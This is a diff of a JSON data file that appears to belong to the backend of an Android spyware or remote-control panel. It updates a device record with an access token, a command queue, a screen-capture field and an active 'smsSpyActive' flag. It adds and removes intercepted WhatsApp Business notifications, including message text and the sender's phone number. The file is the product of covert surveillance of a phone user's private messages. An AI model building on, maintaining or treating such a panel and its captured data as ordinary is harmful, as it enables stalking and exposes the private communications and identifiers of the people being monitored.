@@ -303,7 +303,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775639008228,
+    "lastSeen": 1775639011074,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -319,6 +319,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "+62 898-7564-441",
+        "content": "‎2 pesan baru",
+        "time": "08/04 16:03",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775639012652
+      },
+      {
+        "appName": "WA Business",
+        "sender": "+62 898-7564-441",
+        "content": "Delayy",
+        "time": "08/04 16:03",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775639012487
+      },
       {
         "appName": "WA Business",
         "sender": "WA Business",
@@ -4302,22 +4318,6 @@
         "time": "08/04 14:51",
         "pkg": "com.whatsapp.w4b",
         "receivedAt": 1775634662286
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 898-7564-441",
-        "content": "Gtw gw",
-        "time": "08/04 14:51",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775634662269
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 898-7564-441",
-        "content": "Mna cara pasang nya",
-        "time": "08/04 14:50",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775634656231
       }
     ],
     "galleryPhotos": [],
